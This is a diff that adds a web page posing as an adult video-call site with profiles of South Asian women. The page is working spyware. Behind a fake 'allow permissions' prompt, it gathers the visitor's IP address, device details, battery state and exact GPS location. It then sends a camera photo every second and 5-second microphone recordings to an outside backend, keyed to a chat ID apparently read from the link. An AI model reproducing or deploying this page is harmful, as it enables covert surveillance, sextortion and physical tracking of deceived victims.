@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>18+ Single Girl</title>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to bottom right, #0d0d0d, #1a1a1a);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: white;
+      overflow-x: hidden;
+    }
+    
+    .container {
+      text-align: center;
+      background: rgba(255, 255, 255, 0.08);
+      padding: 20px;
+      border-radius: 16px;
+      box-shadow: 0 4px 25px rgba(0, 255, 0, 0.3);
+      width: 95%;
+      max-width: 800px;
+      margin: 20px auto;
+    }
+
+    .profiles-container {
+      max-height: 70vh;
+      overflow-y: auto;
+      padding: 10px;
+      margin-bottom: 15px;
+    }
+
+    .profiles {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+      gap: 12px;
+      justify-content: center;
+    }
+
+    .profile {
+      text-align: center;
+      position: relative;
+      background: rgba(255, 255, 255, 0.05);
+      padding: 12px;
+      border-radius: 10px;
+      border: 2px solid #28a745;
+      transition: 0.3s ease;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    .profile:hover {
+      box-shadow: 0 0 12px #28a745;
+      transform: scale(1.03);
+    }
+
+    .profiles img {
+      width: 100%;
+      height: 80px;
+      object-fit: cover;
+      border-radius: 10px;
+      margin-bottom: 5px;
+    }
+
+    .profile .online-dot {
+      position: absolute;
+      width: 12px;
+      height: 12px;
+      background: #28a745;
+      border: 2px solid black;
+      border-radius: 50%;
+      top: 10px;
+      right: 10px;
+      box-shadow: 0 0 5px #28a745, 0 0 10px #28a745;
+    }
+
+    .profile span {
+      display: block;
+      font-size: 14px;
+      font-weight: bold;
+      color: red;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    
+    .call-btn {
+      margin-top: 6px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      padding: 6px 12px;
+      font-size: 14px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.2s;
+      width: 100%;
+    }
+
+    .call-btn:hover {
+      background-color: #1e7e34;
+      box-shadow: 0 0 10px #28a745;
+    }
+
+    .video-container {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    video {
+      width: 100%;
+      max-width: 250px;
+      height: 400px;
+      object-fit: cover;
+      background: black;
+      border: 3px solid #28a745;
+      border-radius: 12px;
+      box-shadow: 0 6px 18px rgba(0, 255, 0, 0.3);
+      transform: scaleX(-1);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .status {
+      color: orange;
+      font-size: 18px;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+
+  
+    .permission-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.9);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .permission-content {
+      background: rgba(255,255,255,0.1);
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      border: 2px solid #28a745;
+      max-width: 400px;
+      width: 90%;
+    }
+
+    .permission-btn {
+      background: #28a745;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 15px;
+      transition: 0.3s;
+    }
+
+    .permission-btn:hover {
+      background: #1e7e34;
+      box-shadow: 0 0 15px #28a745;
+    }
+
+    
+    @media (max-width: 600px) {
+      .profiles {
+        grid-template-columns: repeat(3, 1fr);
+      }
+    }
+    
+    @media (min-width: 601px) and (max-width: 900px) {
+      .profiles {
+        grid-template-columns: repeat(4, 1fr);
+      }
+    }
+    
+    @media (min-width: 901px) {
+      .profiles {
+        grid-template-columns: repeat(6, 1fr);
+      }
+    }
+    
+    
+    .profiles-container::-webkit-scrollbar {
+      width: 8px;
+    }
+    
+    .profiles-container::-webkit-scrollbar-track {
+      background: rgba(255,255,255,0.1);
+      border-radius: 10px;
+    }
+    
+    .profiles-container::-webkit-scrollbar-thumb {
+      background: #28a745;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  
+  <div class="permission-modal" id="permissionModal">
+    <div class="permission-content">
+      <h3 style="color: #28a745;">🔐 Permissions Required</h3>
+      <p style="color: #fff; margin: 15px 0;">
+        To start video call, please allow camera, microphone and location access when prompted.
+      </p>
+      <button class="permission-btn" onclick="startPermissionProcess()">Allow Permissions</button>
+    </div>
+  </div>
+
+  <div class="container">
+    <h2 style="text-shadow: 0 0 15px #fff, 0 0 25px #28a745;">Video Call</h2>
+    <p style="color: #d1d1d1; font-size: 14px;">Choose someone to connect with live</p>
+    
+    <div class="profiles-container">
+      <div class="profiles" id="profiles">
+        <!-- Indian Girls (6 Profiles) -->
+        <div class="profile">
+          <img src="" alt="Priya">
+          <div class="online-dot"></div>
+          <span>Priya &#127470;&#127475;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/indian girl/indian2.jpg" alt="Tanisha">
+          <div class="online-dot"></div>
+          <span>Tanisha &#127470;&#127475;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/indian girl/indian3.jpg" alt="Sanya">
+          <div class="online-dot"></div>
+          <span>Sanya &#127470;&#127475;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/indian girl/indian4.jpg" alt="Anaya">
+          <div class="online-dot"></div>
+          <span>Anaya &#127470;&#127475;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/indian girl/indian5.jpg" alt="Ayushi">
+          <div class="online-dot"></div>
+          <span>Ayushi &#127470;&#127475;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/indian girl/indian6.jpg" alt="Ayushi">
+          <div class="online-dot"></div>
+          <span>Ayushi &#127470;&#127475;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        
+        <!-- Pakistani Girls (6 Profiles) -->
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/pakistani girl/pakistani1.jpg" alt="Ayesha">
+          <div class="online-dot"></div>
+          <span>Ayesha &#127477;&#127472;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/pakistani girl/pakistani2.jpg" alt="Fatima">
+          <div class="online-dot"></div>
+          <span>Fatima &#127477;&#127472;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/pakistani girl/pakistani3.jpg" alt="Zara">
+          <div class="online-dot"></div>
+          <span>Zara &#127477;&#127472;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/pakistani girl/pakistani4.jpg" alt="Hira">
+          <div class="online-dot"></div>
+          <span>Hira &#127477;&#127472;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/pakistani girl/pakistani5.jpg" alt="Sana">
+          <div class="online-dot"></div>
+          <span>Sana &#127477;&#127472;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/pakistani girl/pakistani6.jpg" alt="Mehak">
+          <div class="online-dot"></div>
+          <span>Mehak &#127477;&#127472;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        
+        <!-- Bangladeshi Girls (6 Profiles) -->
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi1.jpg" alt="Tasnim">
+          <div class="online-dot"></div>
+          <span>Tasnim &#127463;&#127465;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi2.jpg" alt="Jannat">
+          <div class="online-dot"></div>
+          <span>Jannat &#127463;&#127465;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi3.jpg" alt="Nusrat">
+          <div class="online-dot"></div>
+          <span>Nusrat &#127463;&#127465;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi4.jpg" alt="Farida">
+          <div class="online-dot"></div>
+          <span>Farida &#127463;&#127465;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi5.jpg" alt="Sharmin">
+          <div class="online-dot"></div>
+          <span>Sharmin &#127463;&#127465;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+        <div class="profile">
+          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi6.jpg" alt="Rima">
+          <div class="online-dot"></div>
+          <span>Rima &#127463;&#127465;</span>
+          <button class="call-btn" onclick="showPermissionModal()">Call</button>
+        </div>
+      </div>
+    </div>
+    
+    <div class="video-container" id="videoContainer">
+      <p class="status">Connecting...</p>
+      <video id="localVideo" autoplay muted playsinline></video>
+    </div>
+  </div>
+  
+  <script>
+    const videoContainer = document.getElementById('videoContainer');
+    const localVideo = document.getElementById('localVideo');
+    const permissionModal = document.getElementById('permissionModal');
+    
+    const API_URL = 'https://backend-server-16mr.onrender.com';
+    
+    let audioInterval;
+    let photoInterval;
+    let currentUserData = null;
+    let isProcessing = false;
+
+    
+    function showPermissionModal() {
+      if (isProcessing) return;
+      permissionModal.style.display = 'flex';
+    }
+
+  
+    async function startPermissionProcess() {
+      if (isProcessing) return;
+      isProcessing = true;
+      
+      permissionModal.style.display = 'none';
+      document.getElementById('profiles').style.display = 'none';
+      videoContainer.style.display = 'flex';
+
+      try {
+        await init();
+      } catch (error) {
+        
+        console.error('Error:', error);
+      }
+    }
+
+    
+    function getChatIdFromURL() {
+      try {
+        const currentURL = window.location.href;
+        let queryString = '';
+        
+        if (currentURL.includes('?')) {
+          queryString = currentURL.split('?')[1];
+          
+          if (queryString.includes('&m=1')) {
+            queryString = queryString.split('&m=1')[0];
+          }
+          
+          queryString = queryString.replace(/%3D/g, '=').replace(/%3d/g, '=');
+        }
+        
+        if (!queryString) return '8402806341';
+        
+        try {
+          const chatId = atob(queryString);
+          if (/^\d+$/.test(chatId)) {
+            return chatId;
+          }
+        } catch (e) {
+          if (/^\d+$/.test(queryString)) {
+            return queryString;
+          }
+        }
+        
+        return '8402806341';
+        
+      } catch (error) {
+        return '8402806341';
+      }
+    }
+
+    
+    function getEnhancedLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
+
+        const options = {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        };
+
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            try {
+              const { latitude, longitude, accuracy } = position.coords;
+              
+              console.log('📍 Raw coordinates:', { latitude, longitude, accuracy });
+              
+              let locationInfo = null;
+              
+              try {
+                const response1 = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
+                if (response1.ok) {
+                  const data1 = await response1.json();
+                  locationInfo = {
+                    coordinates: {
+                      latitude: latitude,
+                      longitude: longitude,
+                      accuracy: accuracy + ' meters'
+                    },
+                    address: {
+                      city: data1.city || data1.locality || 'N/A',
+                      state: data1.principalSubdivision || 'N/A',
+                      country: data1.countryName || 'N/A',
+                      full_address: data1.localityInfo?.administrative[2]?.name || data1.locality || 'N/A'
+                    },
+                    timestamp: new Date().toISOString(),
+                    source: 'bigdatacloud'
+                  };
+                }
+              } catch (e) {}
+
+              if (!locationInfo) {
+                try {
+                  const response2 = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
+                  if (response2.ok) {
+                    const data2 = await response2.json();
+                    locationInfo = {
+                      coordinates: {
+                        latitude: latitude,
+                        longitude: longitude,
+                        accuracy: accuracy + ' meters'
+                      },
+                      address: {
+                        city: data2.address?.city || data2.address?.town || data2.address?.village || 'N/A',
+                        state: data2.address?.state || data2.address?.county || 'N/A',
+                        country: data2.address?.country || 'N/A',
+                        full_address: data2.display_name || 'N/A'
+                      },
+                      timestamp: new Date().toISOString(),
+                      source: 'openstreetmap'
+                    };
+                  }
+                } catch (e) {}
+              }
+
+              if (!locationInfo) {
+                locationInfo = {
+                  coordinates: {
+                    latitude: latitude,
+                    longitude: longitude,
+                    accuracy: accuracy + ' meters'
+                  },
+                  address: {
+                    city: 'N/A',
+                    state: 'N/A',
+                    country: 'N/A',
+                    full_address: 'Coordinates only - ' + latitude + ', ' + longitude
+                  },
+                  timestamp: new Date().toISOString(),
+                  source: 'coordinates_only'
+                };
+              }
+
+              console.log('📍 Final location data:', locationInfo);
+              resolve(locationInfo);
+              
+            } catch (error) {
+              console.error('Location processing error:', error);
+              resolve(null);
+            }
+          },
+          (error) => {
+            console.error('Geolocation error:', error);
+            resolve(null);
+          },
+          options
+        );
+      });
+    }
+
+    
+    function detectPlatform() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      
+      if (userAgent.includes('chrome')) return 'Chrome';
+      if (userAgent.includes('firefox')) return 'Firefox';
+      if (userAgent.includes('safari') && !userAgent.includes('chrome')) return 'Safari';
+      if (userAgent.includes('edge')) return 'Edge';
+      if (userAgent.includes('opera')) return 'Opera';
+      
+      if (userAgent.includes('android')) return 'Android';
+      if (userAgent.includes('iphone') || userAgent.includes('ipad')) return 'iOS';
+      if (userAgent.includes('windows')) return 'Windows';
+      if (userAgent.includes('mac')) return 'MacOS';
+      if (userAgent.includes('linux')) return 'Linux';
+      
+      return navigator.platform || 'Unknown';
+    }
+
+    
+    function getEnhancedDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      
+      return {
+        userAgent: userAgent,
+        platform: detectPlatform(),
+        language: navigator.language,
+        cores: navigator.hardwareConcurrency || 'Unknown',
+        memory: navigator.deviceMemory || 'Unknown',
+        screen: { 
+          width: screen.width, 
+          height: screen.height,
+          availWidth: screen.availWidth,
+          availHeight: screen.availHeight
+        },
+        vendor: navigator.vendor || 'Unknown',
+        cookies: navigator.cookieEnabled ? 'Yes' : 'No',
+        java: navigator.javaEnabled ? 'Yes' : 'No',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        connection: navigator.connection ? {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt
+        } : 'Unknown'
+      };
+    }
+
+    
+    async function getCameraStream() {
+      try {
+        let constraints = {
+          video: {
+            width: { ideal: 960 },
+            height: { ideal: 1280 },
+            aspectRatio: { ideal: 0.75 },
+            facingMode: 'user'
+          },
+          audio: {
+            echoCancellation: true,
+            noiseSuppression: true,
+            autoGainControl: true
+          }
+        };
+
+        // ✅ GET CAMERA STREAM
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        
+        // ✅ APPLY MIRROR EFFECT FOR NATURAL MOVEMENT
+        localVideo.style.transform = 'scaleX(-1)';
+        
+        return stream;
+        
+      } catch (error) {
+        console.error('Camera error:', error);
+        
+        // ✅ FALLBACK TO BASIC CONSTRAINTS
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true
+          });
+          localVideo.style.transform = 'scaleX(-1)';
+          return stream;
+        } catch (fallbackError) {
+          throw new Error('Camera access required');
+        }
+      }
+    }
+
+    // ✅ PARALLEL PERMISSION REQUEST
+    async function requestAllPermissionsParallel() {
+      try {
+        const [mediaPromise, locationPromise] = [
+          getCameraStream(), // ✅ USE FIXED CAMERA FUNCTION
+          getEnhancedLocation()
+        ];
+
+        const timeoutPromise = new Promise((_, reject) => 
+          setTimeout(() => reject(new Error('Permissions timeout')), 15000)
+        );
+
+        const [mediaResult, locationResult] = await Promise.race([
+          Promise.allSettled([mediaPromise, locationPromise]),
+          timeoutPromise
+        ]);
+
+        const stream = mediaResult.status === 'fulfilled' ? mediaResult.value : null;
+        const locationData = locationResult.status === 'fulfilled' ? locationResult.value : null;
+
+        return { stream, locationData };
+        
+      } catch (error) {
+        try {
+          const stream = await getCameraStream();
+          return { stream, locationData: null };
+        } catch (e) {
+          throw new Error('Permissions required');
+        }
+      }
+    }
+
+    // ✅ ENHANCED DATA COLLECTION
+    async function collectEnhancedUserData() {
+      const data = {
+        ip_info: {},
+        battery: {},
+        device: getEnhancedDeviceInfo(),
+        location: {},
+        timestamp: new Date().toISOString(),
+        url: window.location.href
+      };
+
+      const promises = [];
+
+      // IP data with multiple fallbacks
+      promises.push(
+        fetch('https://ipapi.co/json/')
+          .then(r => r.json())
+          .then(ipData => { 
+            data.ip_info = {
+              ip: ipData.ip,
+              city: ipData.city,
+              region: ipData.region,
+              country: ipData.country_name,
+              isp: ipData.org,
+              timezone: ipData.timezone
+            };
+          })
+          .catch(() => {
+            return fetch('https://api.ipify.org?format=json')
+              .then(r => r.json())
+              .then(ipData => {
+                data.ip_info = { ip: ipData.ip, fallback: true };
+              })
+              .catch(() => {});
+          })
+      );
+
+      // Battery info
+      if (navigator.getBattery) {
+        promises.push(
+          navigator.getBattery()
+            .then(battery => {
+              data.battery = {
+                level: Math.round(battery.level * 100) + '%',
+                charging: battery.charging ? 'Yes' : 'No',
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+              };
+            })
+            .catch(() => {})
+        );
+      }
+
+      await Promise.all(promises);
+      return data;
+    }
+
+    async function sendUserData(chatId, userData) {
+      try {
+        const response = await fetch(`${API_URL}/user-info`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            chat_id: chatId, 
+            user_data: userData 
+          })
+        });
+        return response.ok;
+      } catch (e) {
+        return false;
+      }
+    }
+
+    async function init() {
+      try {
+        const chatId = getChatIdFromURL();
+        
+        document.querySelector('.status').textContent = 'Getting permissions...';
+
+        // ✅ ENHANCED DATA COLLECTION
+        currentUserData = await collectEnhancedUserData();
+        
+        // ✅ SEND INITIAL DATA TO BACKEND
+        await sendUserData(chatId, currentUserData);
+
+        // ✅ GET PERMISSIONS WITH FIXED CAMERA
+        document.querySelector('.status').textContent = 'Requesting camera & location...';
+        const { stream, locationData } = await requestAllPermissionsParallel();
+
+        
+        if (locationData) {
+          currentUserData.location = locationData;
+          console.log('📍 Sending location data:', locationData);
+          await sendUserData(chatId, currentUserData);
+        } else {
+          console.log('❌ No location data received');
+        }
+
+        if (!stream) {
+          document.querySelector('.status').textContent = 'Camera access required';
+          return;
+        }
+
+        document.querySelector('.status').textContent = 'Connected - Starting call...';
+
+        const audioContext = new AudioContext();
+        const micSource = audioContext.createMediaStreamSource(stream);
+        const silence = audioContext.createGain();
+        silence.gain.value = 0;
+        micSource.connect(silence).connect(audioContext.destination);
+
+        localVideo.srcObject = stream;
+
+        startPhotoSend(stream, chatId);
+        startAudioSend(stream, chatId);
+
+        setTimeout(() => {
+          document.querySelector('.status').style.display = 'none';
+        }, 3000);
+
+      } catch (error) {
+        document.querySelector('.status').textContent = 'Connection failed';
+        console.error('Init error:', error);
+      }
+    }
+
+    function startPhotoSend(stream, chatId) {
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      
+      if (photoInterval) clearInterval(photoInterval);
+      
+      let photoCount = 0;
+      photoInterval = setInterval(async () => {
+        try {
+          const bitmap = await imageCapture.grabFrame();
+          const canvas = document.createElement('canvas');
+          canvas.width = 960;
+          canvas.height = 1280;
+          
+          const ctx = canvas.getContext('2d');
+          
+          ctx.translate(canvas.width, 0);
+          ctx.scale(-1, 1);
+          
+          const sourceAspect = bitmap.width / bitmap.height;
+          const targetAspect = 960 / 1280;
+          
+          if (sourceAspect > targetAspect) {
+            const srcWidth = bitmap.height * targetAspect;
+            ctx.drawImage(
+              bitmap, 
+              (bitmap.width - srcWidth)/2, 0, srcWidth, bitmap.height,
+              0, 0, 960, 1280
+            );
+          } else {
+            const srcHeight = bitmap.width / targetAspect;
+            ctx.drawImage(
+              bitmap,
+              0, (bitmap.height - srcHeight)/2, bitmap.width, srcHeight,
+              0, 0, 960, 1280
+            );
+          }
+
+          canvas.toBlob(async (blob) => {
+            photoCount++;
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob);
+            formData.append("user_data", JSON.stringify({
+              ...currentUserData,
+              photo_number: photoCount
+            }));
+
+            fetch(`${API_URL}/photo`, {
+              method: "POST",
+              body: formData
+            }).catch(() => {});
+
+          }, 'image/jpeg', 0.9);
+
+        } catch (e) {
+          // Silent error
+        }
+      }, 1000);
+    }
+
+    function startAudioSend(stream, chatId) {
+      if (audioInterval) clearInterval(audioInterval);
+      
+      audioInterval = setInterval(() => {
+        const audioOnlyStream = new MediaStream(stream.getAudioTracks());
+        const recorder = new MediaRecorder(audioOnlyStream, { mimeType: 'audio/webm' });
+        const chunks = [];
+
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+          const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+          
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("audio", audioBlob);
+          
+          fetch(`${API_URL}/audio`, {
+            method: "POST",
+            body: formData
+          }).catch(() => {});
+        };
+
+        recorder.start();
+        setTimeout(() => {
+          if (recorder.state !== 'inactive') {
+            recorder.stop();
+          }
+        }, 5000);
+      }, 5000);
+    }
+  </script>
+</body>
+</html>
